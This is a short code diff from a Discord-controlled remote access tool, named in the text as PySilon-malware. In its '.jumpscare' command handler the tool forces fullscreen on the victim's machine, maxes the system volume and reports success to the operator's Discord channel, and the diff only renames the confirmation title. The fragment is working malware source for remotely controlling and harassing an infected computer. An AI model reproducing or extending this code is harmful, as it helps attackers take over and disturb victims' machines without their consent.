@@ -26,6 +26,6 @@ elif message.content == '.jumpscare':
     time.sleep(0.5)
     pyautogui.press('f11')
     volume.SetMasterVolumeLevelScalar(1.0, None)
-    embed = discord.Embed(title="🟢 Jumpscare triggered",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
+    embed = discord.Embed(title="🟢 Success",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
     embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
     await message.channel.send(embed=embed)
